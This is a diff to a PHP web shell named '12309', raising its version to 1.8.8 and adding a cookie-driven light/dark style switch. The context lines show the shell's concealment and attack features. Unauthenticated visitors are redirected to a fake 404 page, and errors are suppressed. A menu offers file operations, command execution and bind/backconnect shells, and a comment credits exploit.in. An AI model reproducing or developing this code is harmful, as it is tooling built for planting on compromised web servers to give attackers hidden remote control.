@@ -15,7 +15,7 @@ if(isset($_REQUEST['l0g1n'])) {
 if(!isset($_SESSION['l0g1n'])) {
  header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
 }
-$ver="1.8.7";
+$ver="1.8.8";
 // --------------------------------------------- globals 
 error_reporting(0);
 @set_time_limit(0);
@@ -55,35 +55,54 @@ function getrows(elem){
  var iNewlineCount = aNewlines.length;
  return iNewlineCount;
 }';
+$design='function cleard() {
+ document.cookie="d=c; path=/;";
+ window.location.reload();
+}
+function blackd() {
+ document.cookie="d=b; path=/;";
+ window.location.reload();
+}';
 $title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <!-- made by 12309 || cheerz to Tidus, Shift, pekayoba, Zer0, ForeverFree and all people whose code i borrowed || exploit.in f0r3v4 -->
 <html>
  <head>
   <title>12309 '.$ver.'</title>
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <style type="text/css">
-   input {
-    background-color: #202020;
-    color: white;
-    border: none;
-   }
-   textarea {
-    background-color: #202020; 
-    color: white;
-    border: none;
-   }
-   input[type="submit"] {
-    background-color: gray;
-    color: white;
-   }
-   BODY {
-    background-color: black;
-    color: white; 
-   }
-  </style>
- </head>
- <body><script type="text/javascript">'.$helpscript.''.$resizescript.'</script>
-  <b><a href="'.$_SERVER['PHP_SELF'].'?p=f">file operations</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=s">execute command</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=b">bind/backconnect</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=e">extras</a></b><br><br>';
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">';
+  if ($_COOKIE['d'] != "c") {
+   echo '<style type="text/css">
+    a {
+     background: green;
+     color: white;
+     text-decoration: none;
+     text-shadow: black 0px 0px 4px;
+    }
+    input {
+     background-color: #202020;
+     color: white;
+     border: none;
+    }
+    textarea {
+     background-color: #202020; 
+     color: white;
+     border: none;
+    }
+    input[type="submit"] {
+     background-color: gray;
+     color: white;
+    }
+    BODY {
+     background-color: black;
+     color: white; 
+    }
+   </style>';
+  }
+  echo '</head><body><script type="text/javascript">'.$helpscript.''.$resizescript.''.$design.'</script><span style="float:left;"><b><a href="'.$_SERVER['PHP_SELF'].'?p=f">file operations</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=s">execute command</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=b">bind/backconnect</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=e">extras</a></b></span><span style="float: right;">';
+ if ($_COOKIE['d'] == "c") {
+  echo '<input type="button" value="black style" onclick="blackd()"></span><br><br>';
+ } else {
+  echo '<input type="button" value="clear style" onclick="cleard()"></span><br><br>';
+ }
 // --------------------------------------------- symbolic permissions 
 function fperms($file)
 {$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';}
